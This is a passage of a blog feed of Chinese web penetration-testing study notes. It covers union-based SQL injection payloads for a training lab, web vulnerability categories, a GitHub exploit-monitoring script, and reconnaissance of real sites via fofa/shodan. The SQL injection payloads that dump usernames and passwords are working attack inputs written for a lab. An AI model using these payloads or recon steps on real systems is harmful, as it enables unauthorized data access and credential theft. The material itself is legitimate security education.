id="猜解列名数量"><a href="#猜解列名数量" class="headerlink" title="猜解列名数量"></a>猜解列名数量</h3><p>猜解列名数量(字段数)   order by x 错误与正常的正常值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 4</span><br></pre></td></tr></table></figure><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>报错猜解准备</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select 1,2,3,4 页面正常说明猜解列名正确</span><br><span class="line">?id=-1 union select 1,2,3,4 通过将id=-1 使后面的语句执行成功,能够在页面中回显的位置将会被数字代替</span><br></pre></td></tr></table></figure><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">数据库版本: version()</span><br><span class="line">数据库名字: database()</span><br><span class="line">数据库用户: user()</span><br><span class="line">操作系统: @@version_compile_os</span><br><span class="line"></span><br><span class="line">查询:</span><br><span class="line">?id=-1 union select 1,database(),3,4</span><br></pre></td></tr></table></figure><h3 id="查询指定数据库名下的表名信息"><a href="#查询指定数据库名下的表名信息" class="headerlink" title="查询指定数据库名下的表名信息"></a>查询指定数据库名下的表名信息</h3><p>指定数据库:mozhe_Discus_StormGroup</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_shchema=&#x27;mozhe_Discus_StormGroup&#x27;</span><br></pre></td></tr></table></figure><p>这样查询只会显示一个需要group_concat()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_shchema=&#x27;mozhe_Discus_StormGroup&#x27;</span><br></pre></td></tr></table></figure><h3 id="查询指定表名名下的列名信息"><a href="#查询指定表名名下的列名信息" class="headerlink" title="查询指定表名名下的列名信息"></a>查询指定表名名下的列名信息</h3><p>指定表:StormGroup_member</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_shchema=&#x27;StormGroup_member&#x27;</span><br></pre></td></tr></table></figure><h3 id="查询指定数据"><a href="#查询指定数据" class="headerlink" title="查询指定数据"></a>查询指定数据</h3><p>这样只能查出一部分,或者只能查出一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,name,password,4 from mozhe_Discus_StormGroup.StormGroup_member</span><br></pre></td></tr></table></figure><p>这样可以将全部信息查出,也可以使用limit 0,x进行多个查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(concat_ws(0x7e,name,password)),3,4 from mozhe_Discus_StormGroup.StormGroup_member</span><br></pre></td></tr></table></figure><h3 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h3><p><a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><p>忍者安全测试系统-禁用软盘安装</p><p><a href="https://www.mozhe.cn/bug/detail/eIRHc1BCd2VlckQxbjduMG9BVCtkZz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/eIRHc1BCd2VlckQxbjduMG9BVCtkZz09bW96aGUmozhe</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11WEB漏洞--必懂知识</title>
      <link href="/2021/09/21/11WEB%E6%BC%8F%E6%B4%9E-%E5%BF%85%E6%87%82%E7%9F%A5%E8%AF%86/"/>
      <url>/2021/09/21/11WEB%E6%BC%8F%E6%B4%9E-%E5%BF%85%E6%87%82%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本章节将讲解各种 WEB 层面上的有那些漏洞类型，具体漏洞的危害等级，以简要的影响范围测试进行实例分析，思维导图中的漏洞也<br>是后面我们将要学习到的各个知识点，其中针对漏洞的形成原理，如何发现，如何利用将是本章节学习的重点内容！</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211102644.png" alt="image-20210823141950857" style="zoom:80%;" /><h3 id="简要说明以上漏洞危害情况"><a href="#简要说明以上漏洞危害情况" class="headerlink" title="简要说明以上漏洞危害情况"></a>简要说明以上漏洞危害情况</h3><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><ol><li>攻击者未经授权可以访问数据库中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露。</li><li>通过操作数据库对某些网页进行篡改;</li><li>修改数据库一些字段的值，嵌入网马链接，进行挂马攻击;攻击者进而可以对网页进行篡改，发布一些违法信息等。</li><li>服务器被远程控制，被安装后门。可以对数据库的数据进行增加或删除操作，例如私自添加或删除管理员账号。</li><li>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。</li><li>破坏硬盘数据，导致全系统瘫痪;</li></ol><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><ol><li>网络钓鱼，包括盗取各类用户账号；</li><li>窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作；</li><li>劫持用户(浏览器)会话，从而执行任意操作，例如进行非法转账、强制发表日志、发送电子邮件等；</li><li>强制弹出广告页面、刷流量等；</li><li>网页挂马，进行恶意操作，例如任意篡改页面信息、删除文章等；</li><li>进行大量的客户端攻击，如DDoS攻击；</li><li>获取客户端信息，例如用户的浏览历史、真实IP、开放端口等；</li><li>控制受害者机器向其他网站发起攻击；</li><li>结合其他漏洞，如CSRF漏洞，实施进一步作恶；</li><li>提升用户权限，包括进一步渗透网站；</li><li>传播跨站脚本蠕虫等；</li></ol><h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><ul><li>文件读取</li><li>命令执行</li><li>内网端口扫描</li><li>攻击内网网站</li><li>发起dos攻击等危害</li></ul><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>如果 Web应用程序存在上传漏洞 , 攻击者甚至可以将一个webshell直接上传到服务器上 </p><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><ul><li>web服务器的文件被外界浏览导致信息泄露</li><li>脚本被任意执行，可能会篡改网站、执行非法操作、攻击其他网站</li></ul><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><p>通过任意文件下载，可以下载服务器的任意文件，web业务的代码，服务器和系统的具体配置信息，也可以下载数据库的配置信息，以及对内网的信息探测等等</p><h4 id="CSRF-用户请求伪造"><a href="#CSRF-用户请求伪造" class="headerlink" title="CSRF(用户请求伪造)"></a>CSRF(用户请求伪造)</h4><p>修改用户信息，如用户的头像、发货地址等。更有甚者，可能执行恶意操作，比如修 改密码、添加/删除好友或者点赞/转发/评论/私信。</p><h4 id="SSRF-服务器端请求伪造"><a href="#SSRF-服务器端请求伪造" class="headerlink" title="SSRF(服务器端请求伪造)"></a>SSRF(服务器端请求伪造)</h4><p>攻击者就可以利用该漏洞绕过防火墙等访问限制，进而将受感染或存在漏洞的服务器作为代理进行端口扫描，甚至是访问内部系统数据。</p><ul><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 Banner 信息</li><li>攻击运行在内网或本地的应用程序（比如溢出）</li><li>对内网 Web 应用进行指纹识别，通过访问默认文件实现</li><li>攻击内外网的 Web 应用，主要是使用 GET 参数就可以实现的攻击</li><li>利用 file 协议读取本地文件</li></ul><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码，被攻击者间接控制服务器</p><h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><ul><li>代码执行漏洞造成的原理是由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。造成代码执行相关的函数分别是：eval、assert函数</li><li>暴露服务器信息</li><li>木马植入</li><li>敏感文件暴露</li><li>可能升级为命令执行</li></ul><h4 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h4><ul><li>大量敏感数据泄露，越权访问，越权重置口令</li><li>商品低价支付经济损失，商品/产品金额、数量篡改等</li><li>活动被恶意刷取，卡/券重复领取，条件竞争等</li><li>源恶意损耗，支付接口、短信/邮件接收</li></ul><h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><p>敏感信息泄露</p><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><ul><li>继承Web服务程序的权限去执行系统命令或读写文件</li><li>反弹shell</li><li>控制整个网站甚至控制服务器</li><li>进一步内网渗透</li></ul><h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><p>攻击者通过访问网站某一目录时，该目录没有默认首页文件或没有正确设置默认首页文件，将会把整个目录结构列出来，将网站结构完全暴露给攻击者； 攻击者可能通过浏览目录结构，访问到某些隐秘文件（如PHPINFO文件、服务器探针文件、网站管理员后台访问地址、数据库连接文件等）</p><h3 id="简要说明以上漏洞等级划分"><a href="#简要说明以上漏洞等级划分" class="headerlink" title="简要说明以上漏洞等级划分"></a>简要说明以上漏洞等级划分</h3><p>高危漏洞：代码执行、文件上传、文件包含、命令执行、SQL注入、未授权访问</p><p>中危漏洞：逻辑安全、反序列化</p><p>低危漏洞：目录遍历、XSS跨站、文件读取</p><h3 id="简要说明以上漏洞重点内容"><a href="#简要说明以上漏洞重点内容" class="headerlink" title="简要说明以上漏洞重点内容"></a>简要说明以上漏洞重点内容</h3><p>CTF：SQL注入、文件上传、反序列化、代码执行</p><p>SRC：图片上漏洞都能出现，逻辑安全出现比较多</p><p>红蓝对抗：涉及的高危漏洞，文件上传、文件包含、代码执行、命令执行</p><h3 id="简要说明以上漏洞形势问题"><a href="#简要说明以上漏洞形势问题" class="headerlink" title="简要说明以上漏洞形势问题"></a>简要说明以上漏洞形势问题</h3><p>找不到漏洞是因为：信息收集没做好，自己对漏洞的理解不够</p><h3 id="pikachu靶场安装"><a href="#pikachu靶场安装" class="headerlink" title="pikachu靶场安装"></a>pikachu靶场安装</h3><h4 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/zhuifengshaonianhanlu/pikachu</span><br></pre></td></tr></table></figure><h4 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211102663.png" alt="image-20210823155333791"></p><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211102285.png" alt="image-20210823155556965"></p><h4 id="初始化成功"><a href="#初始化成功" class="headerlink" title="初始化成功"></a>初始化成功</h4><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211102798.png" alt="image-20210823155631011" style="zoom: 67%;" /><h3 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/zhuifengshaonianhanlu/pikachu</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>10信息收集-资产监控拓展</title>
      <link href="/2021/09/21/10%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%B5%84%E4%BA%A7%E7%9B%91%E6%8E%A7%E6%8B%93%E5%B1%95/"/>
      <url>/2021/09/21/10%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%B5%84%E4%BA%A7%E7%9B%91%E6%8E%A7%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="Github监控"><a href="#Github监控" class="headerlink" title="Github监控"></a>Github监控</h3><p>便于收集整理最新 exp 或 poc<br>便于发现相关测试目标的资产</p><h3 id="各种子域名查询"><a href="#各种子域名查询" class="headerlink" title="各种子域名查询"></a>各种子域名查询</h3><h3 id="DNS-备案-证书"><a href="#DNS-备案-证书" class="headerlink" title="DNS,备案,证书"></a>DNS,备案,证书</h3><h3 id="全球节点请求-cdn"><a href="#全球节点请求-cdn" class="headerlink" title="全球节点请求 cdn"></a>全球节点请求 cdn</h3><p>枚举爆破或解析子域名对应<br>便于发现管理员相关的注册信息</p><h3 id="黑暗引擎相关搜索"><a href="#黑暗引擎相关搜索" class="headerlink" title="黑暗引擎相关搜索"></a>黑暗引擎相关搜索</h3><p>fofa，shodan，zoomeye</p><h3 id="微信公众号接口获取"><a href="#微信公众号接口获取" class="headerlink" title="微信公众号接口获取"></a>微信公众号接口获取</h3><h3 id="内部群内部应用内部接口"><a href="#内部群内部应用内部接口" class="headerlink" title="内部群内部应用内部接口"></a>内部群内部应用内部接口</h3><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211102475.png" alt="f39dd3590e0946f8820476b85d7f8ec6.png" style="zoom:80%;" /><h3 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h3><p>监控最新的EXP发布及其他</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"># Title: wechat push CVE-2020</span><br><span class="line"># Date: 2020-5-9</span><br><span class="line"># Exploit Author: weixiao9188</span><br><span class="line"># Version: 4.0</span><br><span class="line"># Tested on: Linux,windows</span><br><span class="line"># coding:UTF-8</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line">import pandas as pd</span><br><span class="line">time_sleep = 20 #每隔20秒爬取一次</span><br><span class="line">while(True):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3741.400 QQBrowser/10.5.3863.400&quot;&#125;</span><br><span class="line">    #判断文件是否存在</span><br><span class="line">    datas = []</span><br><span class="line">    response1=None</span><br><span class="line">    response2=None</span><br><span class="line">    if os.path.exists(&quot;olddata.csv&quot;):</span><br><span class="line">        #如果文件存在则每次爬取10个</span><br><span class="line">        df = pd.read_csv(&quot;olddata.csv&quot;, header=None)</span><br><span class="line">        datas = df.where(df.notnull(),None).values.tolist()#将提取出来的数据中的nan转化为None</span><br><span class="line">        response1 = requests.get(url=&quot;https://api.github.com/search/repositories?q=CVE-2020&amp;sort=updated&amp;per_page=10&quot;,</span><br><span class="line">                                 headers=headers)</span><br><span class="line">        response2 = requests.get(url=&quot;https://api.github.com/search/repositories?q=phpcms&amp;ssort=updated&amp;per_page=10&quot;,</span><br><span class="line">                                 headers=headers)</span><br><span class="line">    else:</span><br><span class="line">        #不存在爬取全部</span><br><span class="line">        datas = []</span><br><span class="line">        response1 = requests.get(url=&quot;https://api.github.com/search/repositories?q=CVE-2020&amp;sort=updated&amp;order=desc&quot;,headers=headers)</span><br><span class="line">        response2 = requests.get(url=&quot;https://api.github.com/search/repositories?q=RCE&amp;ssort=updated&amp;order=desc&quot;,headers=headers)</span><br><span class="line"></span><br><span class="line">    data1 = json.loads(response1.text)</span><br><span class="line">    data2 = json.loads(response2.text)</span><br><span class="line">    for j in [data1[&quot;items&quot;],data2[&quot;items&quot;]]:</span><br><span class="line">        for i in j:</span><br><span class="line">            s = &#123;&quot;name&quot;:i[&#x27;name&#x27;],&quot;html&quot;:i[&#x27;html_url&#x27;],&quot;description&quot;:i[&#x27;description&#x27;]&#125;</span><br><span class="line">            s1 =[i[&#x27;name&#x27;],i[&#x27;html_url&#x27;],i[&#x27;description&#x27;]]</span><br><span class="line">            if s1 not in datas:</span><br><span class="line">                #print(s1)</span><br><span class="line">                #print(datas)</span><br><span class="line">                params = &#123;</span><br><span class="line">                     &quot;text&quot;:s[&quot;name&quot;],</span><br><span class="line">                    &quot;desp&quot;:&quot; 链接:&quot;+str(s[&quot;html&quot;])+&quot;\n简介&quot;+str(s[&quot;description&quot;])</span><br><span class="line">                &#125;</span><br><span class="line">                print(&quot;当前推送为&quot;+str(s)+&quot;\n&quot;)</span><br><span class="line">                print(params)</span><br><span class="line">                requests.get(&quot;https://sc.ftqq.com/xxxx.send&quot;,params=params,timeout=10)</span><br><span class="line">                #time.sleep(1)#以防推送太猛#，verify=False</span><br><span class="line">                print(&quot;推送完成!&quot;)</span><br><span class="line">                datas.append(s1)</span><br><span class="line">            else:</span><br><span class="line">                pass</span><br><span class="line">                #print(&quot;数据已处在!&quot;)</span><br><span class="line">    pd.DataFrame(datas).to_csv(&quot;olddata.csv&quot;,header=None,index=None)</span><br><span class="line">    time.sleep(time_sleep)</span><br></pre></td></tr></table></figure><h4 id="安装pandas"><a href="#安装pandas" class="headerlink" title="安装pandas"></a>安装pandas</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pandas</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211101102.png" alt="image-20210820151850943"></p><h4 id="Server酱设置"><a href="#Server酱设置" class="headerlink" title="Server酱设置"></a>Server酱设置</h4><p>扫码登录获取自己的SendKey，之后修改到代码中xxxx为SendKey值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://sctapi.ftqq.com/xxxx.send</span><br></pre></td></tr></table></figure><h4 id="最后结果"><a href="#最后结果" class="headerlink" title="最后结果"></a>最后结果</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211101137.png" alt="image-20210820154200037"></p><h4 id="黑暗引擎实现域名端口等收集"><a href="#黑暗引擎实现域名端口等收集" class="headerlink" title="黑暗引擎实现域名端口等收集"></a>黑暗引擎实现域名端口等收集</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211101466.png" alt="image-20210921110147377"></p><h4 id="全自动域名收集枚举优秀脚本使用"><a href="#全自动域名收集枚举优秀脚本使用" class="headerlink" title="全自动域名收集枚举优秀脚本使用"></a>全自动域名收集枚举优秀脚本使用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">以xxxx为例，从标题，域名等收集</span><br><span class="line">以xxxx为例，全自动脚本使用收集</span><br></pre></td></tr></table></figure><h5 id="teemo"><a href="#teemo" class="headerlink" title="teemo"></a>teemo</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip.exe install requirements.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211101119.png" alt="image-20210820160708603"></p><h2 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://crt.sh/</span><br><span class="line">https://dnsdb.io/</span><br><span class="line">https://sc.ftqq.com/3.versionhttps://tools.ipip.net/cdn.php</span><br><span class="line">https://github.com/bit4woo/teemo</span><br><span class="line">https://securitytrails.com/domain/www.baidu.com/history/a</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>09信息收集--APP及其他资产等</title>
      <link href="/2021/09/21/09%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-APP%E5%8F%8A%E5%85%B6%E4%BB%96%E8%B5%84%E4%BA%A7%E7%AD%89/"/>
      <url>/2021/09/21/09%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-APP%E5%8F%8A%E5%85%B6%E4%BB%96%E8%B5%84%E4%BA%A7%E7%AD%89/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在安全测试中，若 WEB 无法取得进展或无 WEB 的情况下，我们需要借助 APP 或其他资产在进行信息收集，从而开展后续渗透，那么其中的信息收集就尤为重要。</p><h3 id="APP提取一键反编译提取"><a href="#APP提取一键反编译提取" class="headerlink" title="APP提取一键反编译提取"></a>APP提取一键反编译提取</h3><h3 id="APP抓数据包进行工具配合"><a href="#APP抓数据包进行工具配合" class="headerlink" title="APP抓数据包进行工具配合"></a>APP抓数据包进行工具配合</h3><h3 id="各种第三方应用相关探针技术"><a href="#各种第三方应用相关探针技术" class="headerlink" title="各种第三方应用相关探针技术"></a>各种第三方应用相关探针技术</h3><h3 id="各种服务接口信息相关探针技术"><a href="#各种服务接口信息相关探针技术" class="headerlink" title="各种服务接口信息相关探针技术"></a>各种服务接口信息相关探针技术</h3><h3 id="APP提取及抓包及后续配合"><a href="#APP提取及抓包及后续配合" class="headerlink" title="APP提取及抓包及后续配合"></a>APP提取及抓包及后续配合</h3><h4 id="某-APK-一键提取反编译"><a href="#某-APK-一键提取反编译" class="headerlink" title="某 APK 一键提取反编译"></a>某 APK 一键提取反编译</h4><p>利用 burp 历史抓更多 URL<br>某 IP 无 WEB 框架下的第三方测试</p><h3 id="某IP无web框架下的第三方测试"><a href="#某IP无web框架下的第三方测试" class="headerlink" title="某IP无web框架下的第三方测试"></a>某IP无web框架下的第三方测试</h3><p>各种端口一顿乱扫-思路</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057931.png" alt="image-20210819191434451"></p><p>shodan</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057963.png" alt="image-20210819185717825"></p><p> 端口8332：发现出现登录框</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211058339.png" alt="image-20210921105821267"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057979.png" alt="image-20210819190135417"></p><p>发现RomPager ，百度一下<br><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211058169.png" alt="image-20210921105829091"></p><p>628端口发现这个</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057997.png" alt="image-20210819190256755"></p><p>fofa发现</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211058593.png" alt="image-20210921105838530"></p><p>各种接口一顿乱扫-思路</p><p>接口部分一顿测试-思路</p><p>旁站查询</p><p>C段查询</p><p>类似域名站点-备案查询：找网址，再ping出ip地址，再用黑暗引擎搜索内容</p><h3 id="演示：某传销网站信息收集"><a href="#演示：某传销网站信息收集" class="headerlink" title="演示：某传销网站信息收集"></a>演示：某传销网站信息收集</h3><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057562.png" alt="image-20210819190620312"></p><p>fofa搜索</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057593.png" alt="image-20210819190833802"></p><p>发现MongoDB-数据库，存在爆破可能</p><p>发现FTP服务</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057790.png" alt="image-20210819191031025"></p><p>发现OpenSSH7.6</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211058583.png" alt="image-20210921105849528"></p><p>百度发现存在用户枚举漏洞</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211058738.png" alt="image-20210921105856663"></p><p>获取到ip</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057320.png" alt="image-20210819191629848"></p><p>fofo子域名发现</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211059918.png"></p><p>查询其子域名</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057874.png" alt="image-20210819191942395"></p><p>C段查询</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211059389.png" alt="image-20210921105933301"></p><p>备案查询</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211059518.png" alt="image-20210921105942441"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211059842.png" alt="image-20210921105951742"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057317.png" alt="image-20210819192546441"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211100729.png" alt="image-20210921110001628"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211100313.png" alt="image-20210921110011238"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211100269.png" alt="image-20210921110018197"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057514.png" alt="image-20210819192653583"></p><ul><li>通过官网名称搜索信息</li></ul><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057238.png" alt="image-20210819192702579"></p><p>搜索php有关界面</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211100540.png" alt="image-20210921110027422"></p><ul><li>搜索时发现.xyz的域名</li></ul><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211100579.png" alt="image-20210921110035465" style="zoom:67%;" />  <p> /robots.txt 发现有用信息</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057771.png" alt="image-20210819192744431">  发现CMS信息</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057773.png" alt="image-20210819192753153"></p><ul><li>子域名查询IP</li></ul><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057809.png" alt="image-20210819192801421">     黑暗引擎搜索有关端口信息等</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057013.png" alt="image-20210819192813735">     搜索</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057405.png" alt="image-20210819192826493"></p><p>查看漏洞</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057422.png" alt="image-20210819192834218"></p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211100223.png" alt="image-20210921110059083" style="zoom:67%;" />  <p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211101638.png" alt="image-20210921110110560"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211101350.png" alt="image-20210921110118292"></p><p>尝试admin</p><p>​    <img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057005.png" alt="image-20210819192924475"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057302.png" alt="image-20210819192933191"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057585.png" alt="image-20210819192942536"></p><h3 id="涉及资源："><a href="#涉及资源：" class="headerlink" title="涉及资源："></a>涉及资源：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://fofa.so/</span><br><span class="line">http://tool.chinaz.com</span><br><span class="line">https://www.shodan.io/</span><br><span class="line">https://www.zoomeye.org/</span><br><span class="line">https://nmap.org/download.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
